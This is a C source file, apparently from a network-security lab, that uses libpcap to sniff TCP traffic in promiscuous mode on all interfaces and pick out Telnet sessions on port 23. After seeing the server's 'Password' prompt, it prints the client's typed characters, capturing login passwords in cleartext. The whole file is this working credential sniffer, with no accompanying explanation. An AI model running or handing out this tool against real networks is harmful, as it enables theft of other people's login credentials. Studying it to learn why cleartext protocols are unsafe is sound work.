#include <pcap.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <net/ethernet.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
int flag=0;
char* check="Password";
/* This function will be invoked by pcap for each captured packet.
We can process each packet inside the function.
*/
void got_packet(u_char *args, const struct pcap_pkthdr *header,const u_char *packet)
{
    packet=packet+2;
    struct ether_header *eth_header;
    eth_header = (struct ether_header *) packet;
    if (ntohs(eth_header->ether_type) != ETHERTYPE_IP) {
        return;
    }
    const u_char *ip_header;
    const u_char *tcp_header;
    const u_char *payload;
    int ethernet_header_length = 14;
    int ip_header_length;
    int tcp_header_length;
    int payload_length;

    ip_header = packet + ethernet_header_length;

    ip_header_length = ((*ip_header) & 0x0F);

    ip_header_length = ip_header_length * 4;
    
    u_char protocol = *(ip_header + 9);
    if (protocol != IPPROTO_TCP) return;
   
    tcp_header = packet + ethernet_header_length + ip_header_length;

    tcp_header_length = ((*(tcp_header + 12)) & 0xF0) >> 4;

    tcp_header_length = tcp_header_length * 4;


    int total_headers_size = ethernet_header_length+ip_header_length+tcp_header_length;

    payload_length = header->caplen-(ethernet_header_length + ip_header_length + tcp_header_length);
    payload = packet + total_headers_size;

    if (ntohs(*((unsigned short*)(tcp_header))) == 0x0017 && !flag) {
    if (payload_length > 0) {
        const u_char *temp_pointer = payload;
        int byte_count = 0;
        int i=0;
        while (byte_count++ < payload_length&&i<strlen(check)) {
        if(*temp_pointer != check[i++]) return;
            temp_pointer++;
        }
        if(i==strlen(check)){ 
        flag=1;
        printf("Password is: ");
        }
    }
    }else if(flag && ntohs(*((unsigned short*)(tcp_header+2))) == 0x0017){
        if (payload_length > 0) {
        const u_char *temp_pointer = payload;
        int byte_count = 0;
        while (byte_count++ < payload_length) {
        if(*temp_pointer == '\r'){
        printf("\n");
        flag=0;
        return;
        }
            printf("%c", *temp_pointer);
            temp_pointer++;
        }
    }
    }
}
int main()
{

pcap_t *handle;
char errbuf[PCAP_ERRBUF_SIZE];
struct bpf_program fp;
char filter_exp[] = "ip proto tcp";
bpf_u_int32 net;

handle = pcap_open_live("any", BUFSIZ, 1, 1000, errbuf);
if(handle==NULL){
printf("Failed pcap_open_live function!\n");
exit(1);
}

pcap_compile(handle, &fp, filter_exp, 0, net);

pcap_setfilter(handle, &fp);

pcap_loop(handle, -1, got_packet, NULL);
pcap_close(handle); 
return 0;
}

